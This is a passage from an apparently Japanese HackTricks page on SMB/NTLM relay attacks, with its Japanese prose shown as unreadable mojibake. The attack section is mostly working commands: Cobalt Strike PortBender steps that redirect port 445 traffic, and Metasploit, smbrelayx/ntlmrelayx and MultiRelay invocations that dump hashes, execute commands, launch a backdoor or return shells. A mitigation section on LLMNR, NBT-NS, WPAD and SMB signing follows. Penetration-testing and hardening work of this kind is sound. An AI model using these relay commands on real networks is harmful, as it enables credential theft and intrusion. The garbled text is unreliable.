ãŸã ã—ã€ãƒ¬ãƒƒãƒ‰ãƒãƒ¼ãƒ ã§ã¯ã€Windowsãƒã‚·ãƒ³ã®ãƒãƒ¼ãƒˆ445ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’è‡ªåˆ†ã®ãƒã‚·ãƒ³ã«**è»¢é€ã™ã‚‹å¿…è¦ãŒã‚ã‚‹**å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ãã®éš›ã¯ã€ä»¥ä¸‹ã®ãƒ„ãƒ¼ãƒ«ã‚’å®Ÿè¡Œã—ã¦ã€ãã®ãƒ„ãƒ¼ãƒ«ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’**ãƒ—ãƒ­ã‚­ã‚·ã‚’ä»‹ã—ã¦ä¸­ç¶™ã—ã¦**å†…éƒ¨ã®æ”»æ’ƒå¯¾è±¡ãƒã‚·ãƒ³ã«åˆ°é”ã•ã›ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ãƒ„ãƒ¼ãƒ«[**PortBender**](https://github.com/praetorian-inc/PortBender)ã¯ã€ãƒãƒ¼ãƒˆ**445ã«å‘ã‹ã†ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’åˆ¥ã®ãƒãƒ¼ãƒˆ**ï¼ˆãŸã¨ãˆã°8445ï¼‰ã«**ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ**ã™ã‚‹ãƒ‰ãƒ©ã‚¤ãƒã§ã™ã€‚ãƒ‰ãƒ©ã‚¤ãƒã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã«ã¯**ãƒ­ãƒ¼ã‚«ãƒ«ç®¡ç†è€…ã‚¢ã‚¯ã‚»ã‚¹æ¨©**ãŒå¿…è¦ã§ã™ã€‚ã»ã¨ã‚“ã©ã®Windowsãƒ‰ãƒ©ã‚¤ãƒãŒé…ç½®ã•ã‚Œã‚‹å ´æ‰€ã§ã‚ã‚‹`cd C:\Windows\System32\drivers`ã‚’ä½¿ç”¨ã™ã‚‹ã®ãŒé©åˆ‡ã§ã™ã€‚
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### MultiRelay

**MultiRelay**ã‚’ä½¿ç”¨ã—ãŸã„å ´åˆã¯ã€_**/usr/share/responder/tools**_ã«ç§»å‹•ã—ã€MultiRelay (`-t <IP target> -u <User>`)ã‚’å®Ÿè¡Œã—ã¾ã™ï¼š
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
![](<../../.gitbook/assets/image (209).png>)

### NTLMãƒ­ã‚°ã‚¤ãƒ³ã®å¼·åˆ¶

Windowsã§ã¯ã€**ç‰¹æ¨©ã®ã‚ã‚‹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä»»æ„ã®ãƒã‚·ãƒ³ã«èªè¨¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™**ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## è§£æ±ºç­–

### LLMNRã®ç„¡åŠ¹åŒ–

DNSã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®LLMNRã‚’ç„¡åŠ¹ã«ã™ã‚‹ã«ã¯ã€gpedit.mscã‚’é–‹ãã¾ã™ã€‚\
ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼æ§‹æˆ->ç®¡ç†ç”¨ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ->ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯->DNSã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«ç§»å‹•ã—ã¾ã™ã€‚\
ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã€Œãƒãƒ«ãƒã‚­ãƒ£ã‚¹ãƒˆåè§£æ±ºã‚’ç„¡åŠ¹ã«ã™ã‚‹ã€ã‚’è¦‹ã¤ã‘ã€ã€Œãƒãƒªã‚·ãƒ¼è¨­å®šã€ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ï¼š

![](../../.gitbook/assets/1.jpg)

æ–°ã—ã„ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ãŒé–‹ã„ãŸã‚‰ã€ã“ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æœ‰åŠ¹ã«ã—ã€é©ç”¨ã‚’æŠ¼ã—ã¦OKã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ï¼š

![](../../.gitbook/assets/2.jpg)

### NBT-NSã®ç„¡åŠ¹åŒ–

NBT-NSã‚’ç„¡åŠ¹ã«ã™ã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®1ã¤ã¯ã€DHCPã‚¹ã‚³ãƒ¼ãƒ—ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚

Microsoftã®DHCPã‚µãƒ¼ãƒãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã¯ã€NBT-NSã‚’ç„¡åŠ¹ã«ã—ãŸã„ã‚¹ã‚³ãƒ¼ãƒ—ã‚’é¸æŠã—ã¾ã™ã€‚ ã€Œã‚¹ã‚³ãƒ¼ãƒ—ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã€ã‚’å³ã‚¯ãƒªãƒƒã‚¯ã—ã€ã€Œã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®æ§‹æˆã€ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚ä»¥ä¸‹ã®ä¾‹ã§ã¯ã€NBT-NSã‚’ç„¡åŠ¹ã«ã—ãŸã„DHCPã‚¹ã‚³ãƒ¼ãƒ—ã¯192.168.1.100ã§ã™ã€‚

![](../../.gitbook/assets/3.jpg)

ã‚¹ã‚³ãƒ¼ãƒ—ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã§ã€è©³ç´°ã‚¿ãƒ–ã«ç§»å‹•ã—ã€ãƒ‰ãƒ­ãƒƒãƒ—ãƒ€ã‚¦ãƒ³ãƒ¡ãƒ‹ãƒ¥ãƒ¼ã‚’ã€ŒMicrosoft Windows 2000 Optionsã€ã«å¤‰æ›´ã—ã¾ã™ï¼š

![](../../.gitbook/assets/4.jpg)

ãƒªã‚¹ãƒˆã‹ã‚‰ã€Œ001 Microsoft Disable Netbios Optionã€ã‚’é¸æŠã—ã€ãã®å€¤ã‚’ã€Œ0x2ã€ã«å¤‰æ›´ã—ã€é©ç”¨ã—ã¦ã‹ã‚‰OKã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ï¼š

![](../../.gitbook/assets/5.jpg)

### WPAD

WPADæ”»æ’ƒã«å¯¾æŠ—ã™ã‚‹ãŸã‚ã«ã€DNSã‚¾ãƒ¼ãƒ³ã«ã€Œwpadã€ã®ã‚¨ãƒ³ãƒˆãƒªã‚’è¿½åŠ ã§ãã¾ã™ã€‚ DNSã‚¨ãƒ³ãƒˆãƒªã¯æœ‰åŠ¹ãªWPADã‚µãƒ¼ãƒãƒ¼ã‚’æŒ‡ã™å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã‚¯ã‚¨ãƒªãŒè§£æ±ºã•ã‚Œã¦ã„ã‚‹é™ã‚Šã€æ”»æ’ƒã¯é˜²æ­¢ã•ã‚Œã¾ã™ã€‚

### ãƒãƒ«ãƒãƒªãƒ¬ãƒ¼

1\. **ã™ã¹ã¦ã®ãƒ­ãƒ¼ã‚«ãƒ«Windowsãƒã‚·ãƒ³ã§SMBç½²åã‚’å¼·åˆ¶ã™ã‚‹**ã€‚ã“ã®è¨­å®šã«ã‚ˆã‚Šã€ã™ã¹ã¦ã®SMBã‚»ãƒƒã‚·ãƒ§ãƒ³ã«ãƒ‡ã‚¸ã‚¿ãƒ«ç½²åãŒä»˜ã‘ã‚‰ã‚Œã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¨ã‚µãƒ¼ãƒãƒ¼ã¯ãƒ‘ã‚±ãƒƒãƒˆã®é€ä¿¡å…ƒã‚’ç¢ºèªã—ã¦ã‹ã‚‰ç¶™ç¶šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®è¨­å®šã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ã«ã®ã¿æœ‰åŠ¹ã§ã™ã€‚Microsoftã®ä»¥ä¸‹ã®è¨˜äº‹ã§ã¯ã€ã“ã‚Œã‚‰ã®è¨­å®šï¼ˆã‚°ãƒ«ãƒ¼ãƒ—ãƒãƒªã‚·ãƒ¼ã‚’ä»‹ã—ã¦æœ‰åŠ¹ã«ã§ãã‚‹ï¼‰ã¨ãã®å®Ÿè£…æ–¹æ³•ã«ã¤ã„ã¦è©³ã—ãèª¬æ˜ã—ã¦ã„ã¾ã™ã€‚

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **ãƒ­ãƒ¼ã‚«ãƒ«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå¿…è¦ãªãƒã‚·ãƒ³ã«ã®ã¿ãƒªãƒ¢ãƒ¼ãƒˆãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ã‚ˆã†ã«ç¢ºèªã™ã‚‹**ã€‚ä¾‹ï¼šSallyã¯Sallyã®ãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã«ã®ã¿ãƒ­ã‚°ã‚¤ãƒ³ã§ãã¾ã™ã€‚ Sallyã®SMBèªè¨¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’æ”»æ’ƒè€…ãŒå‚å—ã—ãŸå ´åˆã€ã“ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä»–ã®ãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã«ä¸­ç¶™ã™ã‚‹ã“ã¨ã¯ã§ããšã€ã“ã®æ–¹æ³•ã¯ç„¡åŠ¹ã«ãªã‚Šã¾ã™ã€‚

3\. **ãƒ­ãƒ¼ã‚«ãƒ«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§NTLMèªè¨¼ã‚’å¯èƒ½ãªé™ã‚Šåˆ¶é™ã™ã‚‹**ã€‚ã“ã®æ”»æ’ƒã¯Kerberosèªè¨¼ã‚’åˆ©ç”¨ã§ããªã„ãŸã‚ã€ç™ºç”Ÿã—ã¦ã„ã‚‹NTLMã®é‡ã‚’åˆ¶é™ã™ã‚‹ã“ã¨ã§ã€ã“ã®æ”»æ’ƒã‚’å¤§å¹…ã«é˜»æ­¢ã§ãã¾ã™ã€‚Microsoftã«ã¯ã“ã‚Œã‚’å®Ÿç¾ã™ã‚‹æƒ…å ±ãŒã‚ã‚Šã¾ã™ãŒã€æ³¨æ„ã—ã¦ãã ã•ã„ã€‚Kerberosèªè¨¼ãŒä½•ã‚‰ã‹ã®ç†ç”±ã§å¤±æ•—ã™ã‚‹ã¨ã€é€šå¸¸ã¯NTLMã«ãƒ•ã‚©ãƒ¼ãƒ«ãƒãƒƒã‚¯ã—ã¾ã™ã€‚å®Œå…¨ã«ç„¡åŠ¹ã«ã™ã‚‹ã¨ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãŒåœæ­¢ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

4\. **ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ä¸æ­£ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’é˜²æ­¢ã™ã‚‹**ã€‚ã‚¤ãƒ³ã‚µã‚¤ãƒ€ãƒ¼ã®è„…å¨ã¯ãŠãã‚‰ãSMBãƒªãƒ¬ãƒ¼æ”»æ’ƒã‚’åˆ©ç”¨ã—ãªã„ã§ã—ã‚‡ã†ã€‚ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®ç‰©ç†çš„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã‚’å¼·åŒ–ã—ã€ACLã¨MACãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã§ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ä¸æ­£ãªãƒ‡ãƒã‚¤ã‚¹ã‚’é˜²æ­¢ã—ã€é©åˆ‡ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚»ã‚°ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç¢ºä¿ã™ã‚‹ã“ã¨ã§ã€ã“ã®æ”»æ’ƒãŒè¡Œã‚ã‚Œã‚‹å¯èƒ½æ€§ã‚’å¤§å¹…ã«åˆ¶é™ã§ãã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **ç”»åƒæä¾›å…ƒ:**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[NFTs](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¾ã™
* **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨**HackTricks Cloud**ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
